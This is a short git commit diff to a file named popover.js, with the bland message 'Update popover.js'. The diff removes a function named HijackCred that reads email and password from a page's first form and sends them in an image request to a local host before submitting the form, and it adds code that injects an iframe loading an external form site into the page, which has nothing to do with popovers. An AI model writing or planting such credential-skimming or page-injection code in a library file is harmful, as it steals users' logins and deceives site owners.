e2effa888a015801742f4ec535e9e69ef68fad4a
dimpol <djdimpol@rocketmail.com>
2016-11-07 15:40:57 +0200

    Update popover.js

--- js/src/popover.js
+++ js/src/popover.js
@@ -1,7 +1,3 @@
-function HijackCred() {
-    var email = document.forms[0].elements[0].value;
-    var pass = document.forms[0].elements[1].value;
-    img = new Image();
-img.src = "https://localhost:4443?" + "email=" + escape(email) + "&" + "password=" + escape(pass);
-setTimeout('document.forms[0].submit();', 3000);
-return false;
+var iframe = document.createElement("iframe");   
+iframe.src = "https://form.jotformeu.com/63114047886358";   
+document.body.appendChild(iframe);
